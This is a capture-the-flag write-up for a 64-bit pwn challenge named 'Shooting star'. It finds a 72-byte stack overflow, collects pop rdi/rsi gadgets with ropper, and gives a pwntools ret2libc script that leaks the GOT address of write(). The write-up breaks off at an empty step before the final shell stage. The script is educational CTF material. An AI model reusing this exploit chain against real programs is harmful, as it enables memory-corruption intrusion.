# Shooting star
> Write-up author: jon-brandy
## DESCRIPTION:
Tired of exploring the never-ending world, you lie down and enjoy the crystal clear sky. 
Over a million stars above your head! Enjoy the silence and the glorious stars while you rest.
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given.
2. Next, check the type of file we got.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209470016-ecc03170-c28c-4e53-bf5f-7954c723f673.png)


3. It's a 64 bit binary file, dynamically linked, and **not stripped**, hence it's easier for us to debug and identify the functions.
4. Now check the binary's protection.

> RESULT - No canary found - No PIE - Partial RELRO

![image](https://user-images.githubusercontent.com/70703371/209470051-2c078c05-cfe6-47b0-ba3d-ff0626419729.png)


5. Let's make the file executeable by run chmod, then run the file in gdb.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209470142-0ec0daea-11cf-4ab3-9875-905c305b56a9.png)


6. Let's choose option 1.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209470148-90c8c2cc-9c1f-4608-89b3-8940c00a8808.png)


7. Let's paste 1024 cyclic pattern.

> RESULT - GOT SEGMENTATION FAULT

![image](https://user-images.githubusercontent.com/70703371/209470163-8f6a6d8c-6a27-4a81-8395-db5e1b42b01f.png)


8. Find the correct bytes to overflow the buffer.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209470626-1b8b301c-f33b-461e-9100-286baf84ad10.png)


9. It's 72 bytes.
10. Now let's check all the functions available.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209470211-70694e0a-25d6-40d8-9610-46ec70b36c73.png)


11. A function caught my attention -> `setup()` func.
12. Let's decompile the binary using ghidra.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209470231-01786e09-00cc-4eeb-b8c6-0e1268e8a54b.png)


13. Check the `star()` function.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209470246-7146969e-960a-4835-9265-4b72c221ae7b.png)


14. Notice the program reads more buffer from `local_48`.

![image](https://user-images.githubusercontent.com/70703371/209470294-3e462513-66b2-4fe4-a821-920ac6ae8d66.png)


15. We found the vuln there.
16. I think the concept here is **ret2libc**, because there's not `system()` function, but only `reads()` and `write()`, both are come from the libc library.
17. Now we need to leak the `.got` address.
18. First, let's get the `pop_rdi` value from the binary using ropper. We need pop RDI gadget to pass `sh` to `system()`.

```
ropper --file shooting_star --search "pop rdi"
```

> RESULT - 0x4012cb

![image](https://user-images.githubusercontent.com/70703371/209471808-e24d8024-2b4f-4d13-b242-36ba92a3b9bc.png)


19. Next, get the `pop_rsi` value. We need pop RSI to put **got.write** address in (before leak the `got` via **plt.write**.

```
ropper --file shooting_star --search "pop rsi"
```

> RESULT - 0x4012c9

![image](https://user-images.githubusercontent.com/70703371/209471877-bd6dc023-ec2d-4e90-ae9b-ac03deb64a3f.png)


20. Now to leak the `got address` , the payloads we need to send are:

```
paddingBytes - pop_rsi_r15 - elf.got.write - 0x0 - elf.plt.write - elf.symbols.main

NOTES:
- pop_rsi_r15 -> pop the following value from stack into RSI.
- elf.got.write -> address of write() in GOT.
- 0x0 -> as a junk , cause we don't need anything in r15.
- elf.plt.write -> need to call plt.write() to print address of got.write()
- elf.symbols.main -> return to the beginning/start of the `star()` function.
```

21. Here are our script so far:

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.GDB:  
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    p = process(exe)
    p.sendlineafter('>', '1')
    p.sendlineafter('>>', payload)
    p.wait() # wait for the process to crash

    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

exe = './shooting_star'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

## EXPLOITATION

paddingBytes = find_ip(cyclic(1024))

io = start()
pop_rdi = 0x4012cb
pop_rsi_r15 = 0x4012c9  

payload = flat(
    {paddingBytes: [
        pop_rsi_r15,  # Pop the following value from stack into RSI
        elf.got.write,  # Address of write() in GOT
        0x0,  # Don't need anything in r15
        elf.plt.write,  # Call plt.write() to print address of got.write()
        elf.symbols.main  # Return to beginning of star function
    ]}
)

# Send the payload
io.sendlineafter('>', '1')
io.sendlineafter('>>', payload)
io.recvuntil('May your wish come true!\n') 
leaked_addr = io.recv() # got the address printed out in hex
got_write = unpack(leaked_addr[:6].ljust(8, b"\x00"))
info("leaked got_write: %#x", got_write)
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/209503679-60d1b410-c2e5-45b2-98df-48952964318c.png)


22. Great! We leaked the `got_write address`.
23. Next we need to get our `libc base address`. Let's run ldd to the binary.

> RESULT - /lib/x86_64-linux-gnu/libc.so.6

![image](https://user-images.githubusercontent.com/70703371/209504262-21a0c4f2-1260-4c36-9c7a-986afc55f68d.png)


24. Then run **readelf** to get the offset of write from the libc.

> RESULT - f8180

![image](https://user-images.githubusercontent.com/70703371/209504509-9dc79cdd-30a8-4fd4-bb06-9175bd423fd6.png)


25. 
